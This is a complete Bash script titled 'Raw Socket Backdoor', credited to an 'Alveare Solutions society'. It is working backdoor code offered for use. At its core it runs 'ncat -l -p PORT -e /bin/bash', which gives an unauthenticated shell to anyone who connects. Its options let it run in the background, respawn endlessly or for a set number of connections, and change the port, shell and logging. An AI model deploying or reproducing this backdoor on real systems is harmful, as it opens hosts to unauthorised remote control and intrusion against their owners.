#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# RAW SOCKET BACKDOOR

RUNNING_MODE='single' # (single | limited | endless)
CONNECTION_LIMIT=3
FOREGROUND_FLAG=0     # (0 | 1)
PORT_NUMBER=8080
VERBOSITY=0           # (0 | 1 | 2 | 3)
LOG_FILE=''           # /path/to/file.log
SHELL_PATH='/bin/bash'

# SETTERS

function set_shell_path () {
    local PATH="$1"
    if [ ! -f "$PATH" ]; then
        log_msg "WARNING" "Invalid shell path value ($SHELL_PATH). Defaulting to (/bin/bash)."
        local PATH='/bin/bash'
    fi
    SHELL_PATH="$PATH"
    return 0
}

function set_foreground_flag () {
    local FLAG=$1
    if [ ! $FLAG -eq 0 ] && [ ! $FLAG -eq 1 ]; then
        log_msg "WARNING" "Invalid foreground flag value ($FLAG). Defaulting to (0)."
        local FLAG=0
    fi
    FOREGROUND_FLAG=$FLAG
    return 0
}

function increment_verbosity_level () {
    local INCREMENT_BY=$1
    check_is_integer $INCREMENT_BY
    if [ $? -ne 0 ]; then
        log_msg "ERROR" "Verbosity incrementation value must be an integer, not ($INCREMENT_BY)."
        return 1
    fi
    NEW_LEVEL=`echo "$INCREMENT_BY + $VERBOSITY" | bc`
    if [ $NEW_LEVEL -gt 3 ] || [ $NEW_LEVEL -lt 0 ]; then
        log_msg "ERROR" "Invalid verbosity level ($NEW_LEVEL) to increment to."
        return 2
    fi
    VERBOSITY=$NEW_LEVEL
    return 0
}

function set_running_mode () {
    local MODE="$1"
    if [[ "$MODE" != 'single' ]] \
            && [[ "$MODE" != 'limited' ]] \
            && [[ "$MODE" != 'endless' ]]; then
        log_msg "WARNING" "Invalid running mode ($MODE). Defaulting to (single)."
        local MODE='single'
    fi
    RUNNING_MODE="$MODE"
    return 0
}

function set_connection_limit () {
    local CNX_LIMIT=$1
    check_is_integer $CNX_LIMIT
    if [ $? -ne 0 ]; then
        log_msg "ERROR" "Connection limit value must be an integer, not ($CNX_LIMIT)."
        return 1
    elif [ $CNX_LIMIT -eq 0 ]; then
        log_msg "WARNING" "Connection limit cannot be ($CNX_LIMIT). Defaulting to 3."
        local CNX_LIMIT=3
    fi
    CONNECTION_LIMIT=$CNX_LIMIT
    return 0
}

function set_port_number () {
    local PORT=$1
    check_is_integer $PORT
    if [ $? -ne 0 ]; then
        log_msg "ERROR" "Port number value must be an integer, not ($PORT)."
        return 1
    fi
    PORT_NUMBER=$PORT
    return 0
}

function set_log_file_path () {
    local FILE_PATH="$1"
    if [ ! -f "$FILE_PATH" ]; then
        log_msg "WARNING" "No file found at ($FILE_PATH). Attempting to create one."
        touch $FILE_PATH &> /dev/null
        if [ $? -eq 0 ]; then
            log_msg "OK" "Successfully created log file ($FILE_PATH)."
        else
            log_msg "ERROR" "Could not create log file ($FILE_PATH)."
            local FILE_PATH=""
        fi
    fi
    LOG_FILE="$FILE_PATH"
    return 0
}

# CHECKERS

function check_is_integer () {
    local VALUE=$1
    test $VALUE -eq $VALUE &> /dev/null
    return $?
}

# FORMATTERS

function format_banner () {
    case $VERBOSITY in
        0)
            local BANNER=""
            ;;
        1)
            local BANNER="
    [ RUNNING MODE     ]: $RUNNING_MODE
    [ PORT NUMBER      ]: $PORT_NUMBER
    [ CONNECTION LIMIT ]: $CONNECTION_LIMIT
        "
            ;;
        2)
            local BANNER="
    [ RUNNING MODE     ]: $RUNNING_MODE
    [ PORT NUMBER      ]: $PORT_NUMBER
    [ CONNECTION LIMIT ]: $CONNECTION_LIMIT
    [ SHELL PATH       ]: $SHELL_PATH
    [ LOG FILE         ]: $LOG_FILE
        "
            ;;
        3)
            local BANNER="
    [ RUNNING MODE     ]: $RUNNING_MODE
    [ PORT NUMBER      ]: $PORT_NUMBER
    [ CONNECTION LIMIT ]: $CONNECTION_LIMIT
    [ SHELL PATH       ]: $SHELL_PATH
    [ LOG FILE         ]: $LOG_FILE
    [ FOREGROUND       ]: $FOREGROUND_FLAG
    [ VERBOSITY LEVEL  ]: $VERBOSITY
        "
            ;;
    esac
    echo "$BANNER"
    return 0
}

function format_log_message () {
    local LOG_LVL="$1"
    local MSG=${@:2}
    case $VERBOSITY in
        0)
            local MESSAGE=""
            ;;
        1)
            local MESSAGE="[ $LOG_LVL ]: $MSG"
            ;;
        2)
            local MESSAGE="`date` [ $LOG_LVL ]: $MSG"
            ;;
        3)
            local MESSAGE="`date` - `whoami` - `hostname` [ $LOG_LVL ]: $MSG"
            ;;
    esac
    echo "$MESSAGE"
    return 0
}

# LOGGERS

function log_msg_to_file () {
    local LOG_LVL="$1"
    local MSG=${@:2}
    if [[ -z "$LOG_FILE" ]] || [ ! -f "$LOG_FILE" ]; then
        return 1
    fi
    format_log_message "$LOG_LVL" "$MSG" >> "$LOG_FILE"
    return $?
}

function log_msg_to_screen () {
    local LOG_LVL="$1"
    local MSG=${@:2}
    if [ $FOREGROUND_FLAG -eq 0 ]; then
        return 1
    fi
    format_log_message "$LOG_LVL" "$MSG"
    return $?
}

function log_msg () {
    local LOG_LVL="$1"
    local MSG=${@:2}
    log_msg_to_screen "$LOG_LVL" "$MSG"
    log_msg_to_file "$LOG_LVL" "$MSG"
    return 0
}

# DISPLAY

function display_header () {
    echo "
    ___________________________________________________________________________

     *            *           * Raw Socket Backdoor *            *           *
    ___________________________________________________________________________
                        Regards, the Alveare Solutions society."
}

function display_banner () {
    display_header
    format_banner
    return 0
}

function display_usage () {
    display_header
    local SCRIPT_NAME=`basename $0`
    cat<<EOF

    [ DESCRIPTION ]: Backdoor.

    [ USAGE ]: $SCRIPT_NAME -<option>=<value>

    -h  | --help                Display this message.
    -v  | --verbose             Raise verbosity level. Can be used up to 3 times.
    -vv | --vverbose            Equivalent of -v -v.
    -vvv| --vvverbose           Equivalent of -v -v -v.
    -f  | --foreground          Keep backdoor in foreground.
    -r= | --running-mode=       Backdoor running mode. Default (single).
    -c= | --connection-limit=   Implies -r=limited. Specifies the number of
                                incomming connection since execution. Default (3).
    -l= | --log-file=           Specifies log file path.
    -p= | --port=               Specifies backdoor port. Default (8080).
    -s= | --shell=              Specifies shell to execute upon incomming
                                connection. Defaults to (/bin/bash).

    [ EXAMPLE ]: $SCRIPT_NAME

    (-v | --verbose             )
    (-f | --foreground          )
    (-r | --running-mode        )=limited       # (single | limited | endless)
    (-c | --connection-limit    )=5
    (-p | --port                )=5432
    (-l | --log-file            )=/var/log/rbd.log
    (-s | --shell               )=/bin/bash

EOF
    return $?
}

# GENERAL

function raw_backdoor () {
    local PORT="$1"
    local SHELL="$2"
    local VERBOSITY_LVL=$3
    log_msg "INFO" "Opening raw socket backdoor on port ($PORT) using shell"\
        "($SHELL). Verbosity level ($VERBOSITY_LVL)."
    if [ -f "$LOG_FILE" ]; then
        OUTPUT="$LOG_FILE"
    else
        OUTPUT="/dev/null"
    fi
    case $VERBOSITY_LVL in
        0)
            ncat -l -p $PORT -e "$SHELL" &> /dev/null
            ;;
        1)
            ncat -v -l -p $PORT -e "$SHELL" 2>&1 | tee -a "$OUTPUT"
            ;;
        2)
            ncat -vv -l -p $PORT -e "$SHELL" 2>&1 | tee -a "$OUTPUT"
            ;;
        3)
            ncat -vvv -l -p $PORT -e "$SHELL" 2>&1 | tee -a "$OUTPUT"
            ;;
    esac
    log_msg "INFO" "Connection terminated."
    return $?
}

function raw_backdoor_single_mode () {
    log_msg "INFO" "Opening raw socket backdoor."
    raw_backdoor $PORT_NUMBER "$SHELL_PATH" $VERBOSITY
    return $?
}

function raw_backdoor_limited_mode () {
    for item in `seq $CONNECTION_LIMIT`; do
        log_msg "INFO" "Opening raw socket backdoor ($item/$CONNECTION_LIMIT)."
        raw_backdoor $PORT_NUMBER "$SHELL_PATH" $VERBOSITY
    done
    log_msg "INFO" "Connection limit reached. Terminating raw socket backdoor."
    return 0
}

function raw_backdoor_endless_mode () {
    COUNT=1
    while :
    do
        log_msg "INFO" "Opening raw socket backdoor ($COUNT)."
        raw_backdoor $PORT_NUMBER "$SHELL_PATH" $VERBOSITY
        if [ $? -ne 0 ]; then
            sleep 2
            continue
        fi
        COUNT=$((COUNT + 1))
    done
    return 0
}

# INIT

function init_raw_backdoor_single_mode () {
    case $FOREGROUND_FLAG in
        0)
            raw_backdoor_single_mode &
            ;;
        1)
            raw_backdoor_single_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor_limited_mode () {
    case $FOREGROUND_FLAG in
        0)
            raw_backdoor_limited_mode &
            ;;
        1)
            raw_backdoor_limited_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor_endless_mode () {
    case $FOREGROUND_FLAG in
        0)
            raw_backdoor_endless_mode &
            ;;
        1)
            raw_backdoor_endless_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor () {
    case "$RUNNING_MODE" in
        'single')
            init_raw_backdoor_single_mode
            ;;
        'limited')
            init_raw_backdoor_limited_mode
            ;;
        'endless')
            init_raw_backdoor_endless_mode
            ;;
        *)
            log_msg "ERROR" "Invalid running mode ($RUNNING_MODE)."
            ;;
    esac
}

# MISCELLANEOUS

if [ $# -eq 0 ] || [ $# -gt 7 ] ; then
    echo "[ ERROR ]: Invalid number of arguments ($#)."
    display_usage
    exit 1
fi

for opt in "$@"
do
    case "$opt" in
        -h|--help)
            display_usage
            exit 0
            ;;
        -f|--foreground)
            set_foreground_flag 1
            ;;
        -v|--verbose)
            increment_verbosity_level 1
            ;;
        -vv|--vverbose)
            increment_verbosity_level 2
            ;;
        -vvv|--vvverbose)
            increment_verbosity_level 3
            ;;
        -r=*|--running-mode=*)
            set_running_mode "${opt#*=}"
            ;;
        -c=*|--connection-limit=*)
            set_connection_limit "${opt#*=}"
            ;;
        -p=*|--port=*)
            set_port_number "${opt#*=}"
            ;;
        -l=*|--log-file=*)
            set_log_file_path "${opt#*=}"
            ;;
        -s=*|--shell=*)
            set_shell_path "${opt#*=}"
            ;;
    esac
done

if [ ! $VERBOSITY -eq 0 ]; then
    display_banner
fi

init_raw_backdoor
exit $?

# CODE DUMP

